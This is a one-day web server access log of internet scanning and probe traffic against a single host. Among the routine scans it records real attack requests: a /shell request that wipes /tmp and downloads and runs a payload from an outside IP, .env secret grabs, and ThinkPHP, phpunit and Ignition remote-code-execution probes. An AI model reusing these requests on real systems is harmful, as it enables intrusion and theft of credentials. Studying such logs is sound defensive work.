185.180.143.18 - - [24/Jan/2023:05:24:40 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.180.143.18 - - [24/Jan/2023:05:24:41 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.254.196.223 - - [24/Jan/2023:05:26:06 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [24/Jan/2023:05:26:06 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
100.21.17.129 - - [24/Jan/2023:06:01:10 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31"
143.110.222.166 - - [24/Jan/2023:06:05:45 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
62.233.50.179 - - [24/Jan/2023:06:05:53 -0600] "\x03" 400 226 "-" "-"
186.4.216.228 - - [24/Jan/2023:06:11:16 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
167.94.146.60 - - [24/Jan/2023:06:19:00 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
167.94.146.60 - - [24/Jan/2023:06:19:00 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.146.60 - - [24/Jan/2023:06:19:00 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
140.246.164.95 - - [24/Jan/2023:06:28:47 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
107.170.255.21 - - [24/Jan/2023:06:31:22 -0600] "GET /manager/text/list HTTP/1.1" 301 249 "-" "Mozilla/5.0 zgrab/0.x"
154.89.5.122 - - [24/Jan/2023:06:50:44 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
107.170.253.15 - - [24/Jan/2023:07:03:42 -0600] "GET /manager/html HTTP/1.1" 301 244 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [24/Jan/2023:07:04:25 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
2001:470:1:c84::19e - - [24/Jan/2023:07:16:48 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.126 Safari/537.36"
2001:470:1:c84::19c - - [24/Jan/2023:07:21:11 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Safari/605.1.15"
2001:470:1:c84::184 - - [24/Jan/2023:07:21:17 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36"
205.185.113.173 - - [24/Jan/2023:08:16:58 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+209.141.51.181/jaws;sh+/tmp/jaws HTTP/1.1" 301 292 "-" "Hello, world"
45.79.168.172 - - [24/Jan/2023:08:20:44 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 zgrab/0.x"
185.254.196.223 - - [24/Jan/2023:08:24:48 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [24/Jan/2023:08:24:48 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.105.128.13 - - [24/Jan/2023:08:32:26 -0600] "\x16\x03\x01" 400 226 "-" "-"
143.110.222.166 - - [24/Jan/2023:09:07:36 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.210.31.22 - - [24/Jan/2023:09:36:38 -0600] "GET / HTTP/1.1" 301 241 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
5.188.210.227 - - [24/Jan/2023:09:53:30 -0600] "GET http://5.188.210.227/echo.php HTTP/1.1" 301 240 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
143.110.222.166 - - [24/Jan/2023:10:08:50 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
179.43.177.242 - - [24/Jan/2023:10:28:56 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
62.233.50.179 - - [24/Jan/2023:10:29:45 -0600] "\x03" 400 226 "-" "-"
79.124.58.186 - - [24/Jan/2023:10:57:41 -0600] "\x03" 400 226 "-" "-"
79.124.58.186 - - [24/Jan/2023:11:03:47 -0600] "\x03" 400 226 "-" "-"
143.110.222.166 - - [24/Jan/2023:11:07:59 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [24/Jan/2023:11:25:11 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [24/Jan/2023:11:25:12 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
180.149.125.159 - - [24/Jan/2023:11:37:47 -0600] "GET /c/ HTTP/1.1" 301 234 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
143.110.222.166 - - [24/Jan/2023:12:11:35 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.32.162.159 - - [24/Jan/2023:12:16:19 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
212.7.228.58 - - [24/Jan/2023:12:26:26 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
159.65.191.145 - - [24/Jan/2023:12:29:07 -0600] "GET / HTTP/1.0" 301 233 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
206.226.64.150 - - [24/Jan/2023:12:34:34 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
206.226.64.150 - - [24/Jan/2023:12:34:35 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:00 -0600] "GET / HTTP/1.0" 301 233 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:27 -0600] "POST /sdk HTTP/1.1" 400 226 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:27 -0600] "GET / HTTP/1.0" 301 233 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:27 -0600] "GET /nmaplowercheck1674586347 HTTP/1.1" 400 226 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:27 -0600] "GET /evox/about HTTP/1.1" 400 226 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:27 -0600] "GET / HTTP/1.1" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:27 -0600] "GET /HNAP1 HTTP/1.1" 400 226 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:37 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:37 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:37 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:37 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:37 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:37 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:37 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:37 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:37 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:37 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:37 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:38 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:39 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:40 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:41 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:42 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:42 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:42 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:42 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:42 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:42 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:42 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:42 -0600] "\x16\x03\x01\x02" 400 226 "-" "-"
2605:a140:2060:8106::1 - - [24/Jan/2023:12:52:47 -0600] "GET / HTTP/1.1" 301 232 "-" "bitdiscovery"
143.110.222.166 - - [24/Jan/2023:13:06:34 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
193.35.18.221 - - [24/Jan/2023:13:08:30 -0600] "CONNECT google.com:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
62.74.116.14 - - [24/Jan/2023:13:12:10 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
185.225.74.247 - - [24/Jan/2023:13:19:13 -0600] "GET /config/getuser?index=0 HTTP/1.1" 301 254 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0"
193.32.162.159 - - [24/Jan/2023:13:38:03 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
159.65.191.145 - - [24/Jan/2023:13:48:59 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:73.0) Gecko/20100101 Firefox/73.0"
2620:96:e000:b0cc:e:2:2:5 - - [24/Jan/2023:13:57:40 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
2620:96:e000:b0cc:e:2:2:5 - - [24/Jan/2023:13:57:40 -0600] "PRI * HTTP/2.0" 400 226 "-" "-"
143.110.222.166 - - [24/Jan/2023:14:06:26 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [24/Jan/2023:14:26:22 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [24/Jan/2023:14:26:22 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.118.39.82 - - [24/Jan/2023:14:33:08 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
169.60.40.142 - - [24/Jan/2023:14:39:03 -0600] "CONNECT www.google.com:443 HTTP/1.1" 301 232 "-" "Go-http-client/1.1"
185.224.128.219 - - [24/Jan/2023:14:53:14 -0600] "GET /admin/config.php HTTP/1.1" 301 248 "-" "python-requests/2.22.0"
143.110.222.166 - - [24/Jan/2023:15:07:59 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
45.61.186.176 - - [24/Jan/2023:15:36:04 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
167.71.219.70 - - [24/Jan/2023:15:41:48 -0600] "\x16\x03\x01" 400 226 "-" "-"
167.71.219.70 - - [24/Jan/2023:15:41:48 -0600] "\x16\x03\x01" 400 226 "-" "-"
167.71.219.70 - - [24/Jan/2023:15:41:49 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
20.55.69.239 - - [24/Jan/2023:15:49:59 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.55.69.239 - - [24/Jan/2023:15:49:59 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.242 - - [24/Jan/2023:16:03:12 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [24/Jan/2023:16:05:54 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
51.195.157.191 - - [24/Jan/2023:16:31:46 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36"
143.110.222.166 - - [24/Jan/2023:17:09:20 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
103.20.248.188 - - [24/Jan/2023:17:12:23 -0600] "GET /invoker/readonly HTTP/1.1" 301 248 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15"
103.20.248.188 - - [24/Jan/2023:17:12:24 -0600] "POST /_ignition/execute-solution HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15"
103.20.248.188 - - [24/Jan/2023:17:12:24 -0600] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 282 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15"
103.20.248.188 - - [24/Jan/2023:17:12:24 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15"
103.20.248.188 - - [24/Jan/2023:17:12:25 -0600] "GET /login HTTP/1.1" 301 237 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15"
103.20.248.188 - - [24/Jan/2023:17:12:25 -0600] "GET /manager/html HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15"
103.20.248.188 - - [24/Jan/2023:17:12:26 -0600] "GET /wp-login.php HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15"
103.20.248.188 - - [24/Jan/2023:17:12:26 -0600] "GET /?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=c66xjt8f HTTP/1.1" 301 340 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.2 Safari/605.1.15"
193.35.18.242 - - [24/Jan/2023:17:22:20 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
185.254.196.223 - - [24/Jan/2023:17:24:51 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [24/Jan/2023:17:24:51 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
179.43.177.242 - - [24/Jan/2023:17:32:53 -0600] "GET / HTTP/1.1" 301 232 "-" "Hello World"
